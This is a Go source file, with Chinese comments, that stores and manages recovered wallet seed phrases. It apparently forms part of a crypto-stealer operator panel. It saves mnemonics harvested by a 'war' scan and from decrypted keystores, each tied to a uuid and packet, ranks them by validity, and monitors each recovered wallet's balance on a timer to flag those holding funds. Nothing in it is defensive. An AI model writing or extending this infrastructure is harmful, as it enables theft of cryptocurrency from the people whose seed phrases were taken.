package store

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
)

// 助记词库：集中存放解析/还原出来的助记词（war 工具检测 / 备忘录 BIP39 命中等）。

// RecoveredWord 一条还原出来的助记词。
type RecoveredWord struct {
	Phrase     string
	Words      int
	Valid      bool
	Wallet     string
	Crosscheck string
}

// SaveRecoveredWords 写入助记词库（幂等：唯一键 uuid+phrase 前缀）。
func SaveRecoveredWords(uuid, source string, packetID int64, items []RecoveredWord) int {
	if len(items) == 0 {
		return 0
	}
	db := GetDB()
	if db == nil {
		return 0
	}
	ts, _ := Now()
	n := 0
	for _, w := range items {
		if strings.TrimSpace(w.Phrase) == "" {
			continue
		}
		words := w.Words
		if words == 0 {
			words = len(strings.Fields(w.Phrase))
		}
		db.Exec("INSERT INTO recovered_words(uuid,source,packet_id,phrase,words,valid,wallet,crosscheck,created_ts)"+
			" VALUES(?,?,?,?,?,?,?,?,?)"+
			" ON DUPLICATE KEY UPDATE words=VALUES(words), valid=VALUES(valid), wallet=VALUES(wallet),"+
			" crosscheck=VALUES(crosscheck), packet_id=VALUES(packet_id), created_ts=VALUES(created_ts)",
			uuid, source, packetID, w.Phrase, words, b2i(w.Valid),
			clipStr(w.Wallet, 64), clipStr(w.Crosscheck, 255), ts)
		n++
	}
	return n
}

// ListRecoveredWords 助记词库分页检索。
func ListRecoveredWords(page, per int, onlyValid bool, kw string) map[string]any {
	db := GetDB()
	if page < 1 {
		page = 1
	}
	if per < 1 || per > 500 {
		per = 50
	}
	var conds []string
	var args []any
	if onlyValid {
		conds = append(conds, "valid=1")
	}
	if k := strings.TrimSpace(kw); k != "" {
		conds = append(conds, "(phrase LIKE ? OR uuid LIKE ? OR wallet LIKE ?)")
		args = append(args, "%"+k+"%", "%"+k+"%", "%"+k+"%")
	}
	where := ""
	if len(conds) > 0 {
		where = " WHERE " + strings.Join(conds, " AND ")
	}
	total := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM recovered_words"+where, args...); row != nil {
		total = int(toInt(row["n"]))
	}
	qargs := append(append([]any{}, args...), per, (page-1)*per)
	rows := db.Query("SELECT id,uuid,source,packet_id,phrase,words,valid,wallet,crosscheck,created_ts,balance_usd,balance_ts,balance_json,monitored"+
		" FROM recovered_words"+where+
		" ORDER BY monitored DESC, valid DESC, words DESC, created_ts DESC LIMIT ? OFFSET ?", qargs...)
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		out = append(out, map[string]any{
			"id": toInt(r["id"]), "uuid": toStr(r["uuid"]), "source": toStr(r["source"]),
			"packet_id": toInt(r["packet_id"]), "phrase": toStr(r["phrase"]),
			"words": toInt(r["words"]), "valid": toInt(r["valid"]) == 1,
			"wallet": toStr(r["wallet"]), "crosscheck": toStr(r["crosscheck"]),
			"created_ts":      toStr(r["created_ts"]),
			"balance_usd":     toFloat(r["balance_usd"]),
			"balance_ts":      toStr(r["balance_ts"]),
			"monitored":       toInt(r["monitored"]) == 1,
			"has_balance":     toStr(r["balance_json"]) != "",
			"balance_summary": summarizeBalance(toStr(r["balance_json"])),
		})
	}
	return map[string]any{"rows": out, "total": total, "page": page, "per": per}
}

// summarizeBalance 从缓存的 chainquery 结果里提炼「有余额」的币种与数量（最多 8 项）。
func summarizeBalance(js string) string {
	if js == "" {
		return ""
	}
	var job map[string]any
	if json.Unmarshal([]byte(js), &job) != nil {
		return ""
	}
	results, _ := job["results"].([]any)
	var parts []string
	for _, rv := range results {
		m, _ := rv.(map[string]any)
		if m == nil {
			continue
		}
		for _, key := range []string{"rows", "tokens"} {
			if arr, ok := m[key].([]any); ok {
				for _, it := range arr {
					im, _ := it.(map[string]any)
					if im == nil {
						continue
					}
					bal := toFloat(im["balance"])
					if bal == 0 {
						bal = toFloat(im["amount"])
					}
					if bal == 0 {
						continue
					}
					sym := toStr(im["chain"])
					if key == "tokens" {
						sym = toStr(im["symbol"])
					}
					parts = append(parts, fmt.Sprintf("%s %s", sym, strings.TrimRight(strings.TrimRight(fmt.Sprintf("%.6f", bal), "0"), ".")))
				}
			}
		}
	}
	if len(parts) > 8 {
		parts = parts[:8]
	}
	return strings.Join(parts, " · ")
}

// PendingBalanceWords 尚未查过余额、且**已开启监控**的助记词（balance_ts 为空）。
func PendingBalanceWords(limit int) []map[string]any {
	db := GetDB()
	if db == nil {
		return nil
	}
	if limit <= 0 || limit > 100 {
		limit = 3
	}
	return db.Query("SELECT id, phrase FROM recovered_words"+
		" WHERE monitored=1 AND balance_ts='' AND phrase<>'' ORDER BY id LIMIT ?", limit)
}

// SetWordMonitored 开关某条助记词的监控；开启时清空 balance_ts 触发立即查询。
func SetWordMonitored(id int64, on bool) {
	db := GetDB()
	if db == nil || id <= 0 {
		return
	}
	if on {
		db.Exec("UPDATE recovered_words SET monitored=1, balance_ts='' WHERE id=?", id)
	} else {
		db.Exec("UPDATE recovered_words SET monitored=0 WHERE id=?", id)
	}
}

// SaveWordBalance 写回余额缓存（json 全文 + 美元合计 + 时间）。
func SaveWordBalance(id int64, balanceJSON string, usd float64) {
	db := GetDB()
	if db == nil {
		return
	}
	ts, _ := Now()
	db.Exec("UPDATE recovered_words SET balance_json=?, balance_usd=?, balance_ts=? WHERE id=?",
		balanceJSON, usd, ts, id)
}

// ResetWordBalances 清空余额缓存触发重查（all=true 全部；否则指定 id）。
func ResetWordBalances(id int64, all bool) {
	db := GetDB()
	if db == nil {
		return
	}
	if all {
		db.Exec("UPDATE recovered_words SET balance_ts='' WHERE monitored=1 AND phrase<>''")
	} else {
		db.Exec("UPDATE recovered_words SET balance_ts='' WHERE id=?", id)
	}
}

// WordBalanceJSON 单条助记词的缓存余额 JSON。
func WordBalanceJSON(id int64) string {
	db := GetDB()
	if db == nil {
		return ""
	}
	if row := db.QueryOne("SELECT balance_json FROM recovered_words WHERE id=?", id); row != nil {
		return toStr(row["balance_json"])
	}
	return ""
}

// GetBalanceIntervalMin 余额自动重查间隔（分钟，默认 5，最小 1）。
func GetBalanceIntervalMin() int {
	db := GetDB()
	if db == nil {
		return 5
	}
	if row := db.QueryOne("SELECT v FROM kv WHERE k='balance_interval_min'"); row != nil {
		if n := int(toInt(row["v"])); n >= 1 {
			return n
		}
	}
	return 5
}

// SetBalanceIntervalMin 设置余额自动重查间隔（分钟）。
func SetBalanceIntervalMin(m int) int {
	if m < 1 {
		m = 1
	}
	if m > 1440 {
		m = 1440
	}
	db := GetDB()
	if db == nil {
		return m
	}
	ts, _ := Now()
	db.Exec("INSERT INTO kv(k,v,updated_ts) VALUES('balance_interval_min',?,?)"+
		" ON DUPLICATE KEY UPDATE v=VALUES(v), updated_ts=VALUES(updated_ts)", strconv.Itoa(m), ts)
	return m
}

// RecoveredWordsStats 汇总。
func RecoveredWordsStats() map[string]any {
	db := GetDB()
	out := map[string]any{"total": 0, "valid": 0}
	if db == nil {
		return out
	}
	if row := db.QueryOne("SELECT COUNT(*) n, COALESCE(SUM(valid),0) v FROM recovered_words"); row != nil {
		out["total"] = toInt(row["n"])
		out["valid"] = toInt(row["v"])
	}
	return out
}

// BackfillRecoveredFromWarScan 从已有 war_scan.detail_json 回填助记词库（一次性）。
func BackfillRecoveredFromWarScan() int {
	db := GetDB()
	if db == nil {
		return 0
	}
	if row := db.QueryOne("SELECT v FROM kv WHERE k='recovered_backfilled_v2'"); row != nil && toStr(row["v"]) == "1" {
		return 0
	}
	ts, _ := Now()
	n := 0
	for _, r := range db.Query("SELECT packet_id, uuid, detail_json FROM war_scan" +
		" WHERE detail_json IS NOT NULL AND detail_json<>''") {
		var rep map[string]any
		if json.Unmarshal([]byte(toStr(r["detail_json"])), &rep) != nil {
			continue
		}
		seen := map[string]bool{}
		var items []RecoveredWord
		if arr, ok := rep["secrets"].([]any); ok {
			for _, sv := range arr {
				m, ok := sv.(map[string]any)
				if !ok {
					continue
				}
				if !strings.Contains(strings.ToLower(toStr(m["type"])), "mnemonic") {
					continue
				}
				ph := strings.TrimSpace(toStr(m["value"]))
				if ph == "" || seen[ph] {
					continue
				}
				seen[ph] = true
				valid, _ := m["bip39"].(bool)
				wallet := toStr(m["table"])
				if bs, ok := m["brands"].([]any); ok && len(bs) > 0 {
					wallet = toStr(bs[0])
				}
				items = append(items, RecoveredWord{
					Phrase: ph, Words: len(strings.Fields(ph)), Valid: valid,
					Wallet: wallet, Crosscheck: toStr(m["crosscheck"]),
				})
			}
		}
		// keystore 解密出的明文助记词
		if ks, ok := rep["keystores"].([]any); ok {
			for _, kv := range ks {
				m, ok := kv.(map[string]any)
				if !ok || !strings.EqualFold(toStr(m["status"]), "DECRYPTED") {
					continue
				}
				ph := strings.TrimSpace(toStr(m["plaintext"]))
				if ph == "" || seen[ph] {
					continue
				}
				seen[ph] = true
				items = append(items, RecoveredWord{
					Phrase: ph, Words: len(strings.Fields(ph)), Valid: true,
					Crosscheck: "keystore 解密",
				})
			}
		}
		if len(items) > 0 {
			n += SaveRecoveredWords(toStr(r["uuid"]), "war", toInt(r["packet_id"]), items)
		}
	}
	db.Exec("INSERT INTO kv(k,v,updated_ts) VALUES('recovered_backfilled_v2','1',?)"+
		" ON DUPLICATE KEY UPDATE v=VALUES(v), updated_ts=VALUES(updated_ts)", ts)
	return n
}
